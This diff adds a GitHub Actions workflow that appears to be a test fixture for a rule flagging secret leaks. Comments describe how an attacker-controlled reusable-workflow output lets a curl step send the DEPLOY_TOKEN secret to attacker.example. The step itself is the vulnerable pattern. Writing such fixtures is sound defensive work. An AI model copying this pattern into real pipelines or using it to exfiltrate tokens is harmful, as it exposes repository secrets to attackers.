@@ -1,0 +1,22 @@
+# situation: the job a calls a reusable workflow of the repository, and in
+#   the job j a step sends a request with curl and the secret DEPLOY_TOKEN
+#   to the host needs.a.outputs.o names.
+# reason: the output is what the called workflow gives, which is not read
+#   here.
+# cause: the rule does not read the called workflow's outputs.
+# attack: the attacker makes the value attacker.example, where the value
+#   comes from what the attacker writes.
+# attack-run-behavior: curl sends the request with the secret to
+#   attacker.example.
+on: issues
+jobs:
+  a:
+    uses: ./.github/workflows/w.yml
+  j:
+    needs: a
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ needs.a.outputs.o }}/status"
